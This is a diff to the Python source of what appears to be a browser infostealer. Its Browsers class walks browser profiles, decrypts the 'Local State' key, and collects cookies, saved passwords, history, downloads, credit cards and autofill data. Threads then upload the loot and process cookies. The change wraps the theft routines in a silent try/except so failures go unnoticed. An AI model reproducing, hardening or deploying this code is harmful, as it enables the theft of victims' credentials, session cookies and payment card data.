@@ -62,13 +62,16 @@ class Browsers():
         self.prof = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
         for i in paths:
             if os.path.exists(i):
-                key = self._key(os.path.join(i, "Local State"))
-                self.cookies(i, key)
-                self.passwords(i, key)
-                self.history(i)
-                self.downloads(i)
-                self.ccs(i, key)
-                self.autofill(i)
+                try:
+                    key = self._key(os.path.join(i, "Local State"))
+                    self.cookies(i, key)
+                    self.passwords(i, key)
+                    self.history(i)
+                    self.downloads(i)
+                    self.ccs(i, key)
+                    self.autofill(i)
+                except:
+                    pass
         t1 = Thread(target=self._upload)
         t2 = Thread(target=CookieInfo,args=([self.Cookies]))
         t1.start();t2.start()
